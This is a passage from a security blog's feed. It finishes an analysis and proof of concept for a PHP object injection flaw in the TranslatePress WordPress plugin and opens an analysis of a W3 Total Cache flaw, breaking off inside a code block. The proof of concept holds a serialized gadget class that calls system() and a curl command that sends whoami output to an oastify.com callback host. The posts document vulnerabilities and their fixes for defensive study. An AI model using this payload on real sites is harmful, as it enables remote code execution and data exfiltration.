class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;nonce&lt;/code&gt; is missing, the vulnerability can be exploited unauthenticated by tricking an admin into visiting an attacker-controlled page. The browser will send the request with admin cookies, &lt;code&gt;manage_options&lt;/code&gt; will pass, and backend logic proceeds.&lt;/p&gt;&#xA;&lt;p&gt;Searching for the &lt;code&gt;trp_update_database&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#34; title=&#34;Search result for trp_update_database&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Search result for trp_update_database&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#39; alt=&#34;Search&#34; height=&#34;537&#34; width=&#34;1260&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search result for trp_update_database&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;trp_update_database&lt;/code&gt; is assigned to the &lt;code&gt;page&lt;/code&gt; parameter, meaning it is the callback invoked when visiting &lt;code&gt;/wp-admin/admin.php?page=trp_update_database&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Administrator&amp;ensp;visits&amp;ensp;/wp-admin/admin.php?page=trp_update_database&#34;]&amp;ensp;--&gt;&amp;ensp;B[&#34;trp_update_database()&amp;ensp;invoked&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C{&#34;Check&amp;ensp;capability:&amp;ensp;current_user_can(manage_options)&#34;}&#xD;&#xA;C&amp;ensp;--&gt;|Fail|&amp;ensp;X[&#34;Stop&amp;ensp;&amp;&amp;ensp;print&amp;ensp;error:&amp;ensp;insufficient&amp;ensp;privilege&#34;]&#xD;&#xA;C&amp;ensp;--&gt;|Pass|&amp;ensp;D[&#34;Verify&amp;ensp;nonce:&amp;ensp;wp_verify_nonce()&#34;]&#xD;&#xA;&#xD;&#xA;D&amp;ensp;--&gt;|Fail|&amp;ensp;Y[&#34;Stop&amp;ensp;&amp;&amp;ensp;print&amp;ensp;error:&amp;ensp;Invalid&amp;ensp;nonce&#34;]&#xD;&#xA;D&amp;ensp;--&gt;|Pass|&amp;ensp;E[&#34;Read&amp;ensp;trp_updb_extra_params&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;base64_decode()&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;unserialize()&#34;]&#xD;&#xA;&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H{&#34;Is&amp;ensp;payload&amp;ensp;malicious?&#34;}&#xD;&#xA;H&amp;ensp;--&gt;|Yes|&amp;ensp;R[&#34;Object&amp;ensp;Injection&amp;ensp;→&amp;ensp;Code&amp;ensp;Execution&amp;ensp;(RCE)&#34;]&#xD;&#xA;H&amp;ensp;--&gt;|No|&amp;ensp;S[&#34;Continue&amp;ensp;update&amp;ensp;process&amp;ensp;normally&#34;]&#xD;&#xA;&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create test class in &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls&amp;ensp;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send request through BurpSuite proxy&lt;/li&gt;&#xA;&lt;li&gt;Resend the request with &lt;code&gt;trp_updb_extra_params&lt;/code&gt; containing a serialized Base64-encoded payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;trp_updb_extra_params&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;O:4:&amp;#34;Evil&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:75:&amp;#34;curl&amp;ensp;http://p8ye6bo0snakjfntwfcv7zvcz35utkh9.oastify.com/?leadked=$(whoami)&amp;#34;;}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-HTTP&#34; data-lang=&#34;HTTP&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-admin/admin-ajax.php&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;administrator_cookie&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;action=trp_update_database&amp;amp;trp_updb_nonce=808dff22f9&amp;amp;initiate_update=true&amp;amp;trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NzU6ImN1cmwgaHR0cDovL3A4eWU2Ym8wc25ha2pmbnR3ZmN2N3p2Y3ozNXV0a2g5Lm9hc3RpZnkuY29tLz9sZWFka2VkPSQod2hvYW1pKSI7fQ==&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#34; title=&#34;Output&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Output&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#39; alt=&#34;Result&#34; height=&#34;379&#34; width=&#34;1073&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Output&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;The vulnerability originates from directly using &lt;code&gt;unserialize()&lt;/code&gt; on user-controlled input without additional validation, enabling arbitrary object instantiation and potential remote code execution if a crafted payload is supplied. Combined with CSRF, an attacker could trick an admin into executing the payload silently. Switching to &lt;code&gt;json_decode()&lt;/code&gt; in version 2.9.7 removes the attack surface entirely and properly resolves the issue.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; on untrusted input always carries Object Injection and RCE risks.&lt;/li&gt;&#xA;&lt;li&gt;User input must be validated and sanitized before processing.&lt;/li&gt;&#xA;&lt;li&gt;CSRF can escalate an “authenticated exploit” into a “silent exploitation” scenario.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;json_decode()&lt;/code&gt; is a safer choice for structured data exchange.&lt;/li&gt;&#xA;&lt;li&gt;Comparing code differences between vulnerable and patched versions helps quickly identify root causes and solutions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/translatepress-multilingual/vulnerability/wordpress-translatepress-2-9-6-php-object-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin &amp;lt;= 2.9.6 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9501 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-22-cve-2025-9501/</link>
      <pubDate>Sat, 22 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-22-cve-2025-9501/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress W3 Total Cache plugin prior to version 2.8.13 has a command injection vulnerability via the &lt;code&gt;_parse_dynamic_mfunc&lt;/code&gt; function, allowing unauthenticated users to execute PHP commands by submitting a comment with a malicious payload.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9501&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9501&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.8.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.8.13&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/w3-total-cache/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;W3 Total Cache&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.12&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.13&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from the &lt;code&gt;_parse_dynamic_mfunc&lt;/code&gt; function:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;_parse_dynamic_mfunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$matches&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 